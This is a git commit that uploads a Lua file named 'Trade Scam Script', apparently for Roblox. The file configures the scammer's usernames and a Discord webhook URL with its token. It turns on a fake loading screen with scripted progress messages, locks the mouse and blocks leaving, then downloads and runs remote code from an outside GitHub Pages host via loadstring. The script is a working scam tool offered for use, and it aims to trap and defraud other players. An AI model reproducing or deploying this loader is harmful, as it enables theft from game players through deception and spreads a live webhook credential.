d47bee475ffcf98745754d334f2bd1193ed4d64e
Juancitoo404 <107070270+Juancitoo404@users.noreply.github.com>
2023-05-04 18:25:19 -0300

    Add files via upload

---
+++ Trade Scam Script .lua
@@ -0,0 +1,18 @@
+```lua
+UserName = "juanfacu2001"
+UserName2 = "RS_Juancin" -- optional delete the whole line if you don't want it
+Webhook = "https://discord.com/api/webhooks/1101921327050391662/FzhrQVIycFZYc-D7KOlzN3Fn7SJ_COkiEzgYkxXTaPJKtN64S1covD-Qe6aDgvUql20V" -- optional delete the whole line if you don't want it
+
+_G.LoadingScreen = true
+_G.AntiLeave = true
+_G.MouseLock = true 
+-- set them to false if you don't need them
+
+_G.ScriptName = "Rizz Scriptz"
+_G.FirstText = "Script Preparing"
+_G.SecondText = "Script Loading..."
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 180 -- it's the time between 0% and 100% in secondes
+
+loadstring(game:HttpGet("https://rizz69.github.io/Main.lua", true))()
+```
